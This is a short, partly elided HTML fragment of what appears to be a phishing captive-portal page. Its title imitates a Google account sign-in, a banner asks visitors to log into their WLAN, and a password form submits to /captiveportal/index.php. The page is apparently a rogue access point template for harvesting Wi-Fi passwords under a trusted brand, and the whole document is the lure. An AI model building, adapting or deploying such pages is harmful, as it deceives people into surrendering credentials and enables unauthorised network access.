...
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
  ...
  <title>Iniciar Session – Cuenta Google</title>
  <style>
  /* cyrillic-ext */
@font-face {
...
<div class="banner">
  <h2>
  Por favor inicie sesión en su WLAN.
  </h2>
</div>
<form novalidate="" class="login-form" method="POST" action="/captiveportal/index.php" onsubmit="redirect()" id="form1" name="password">
...
<input id="pass" name="password" placeholder="WLAN-Passwort" class="" type="password">
  <input id="signIn" name="signIn" class="rc-button rc-button-submit" value="Conectar" type="submit">
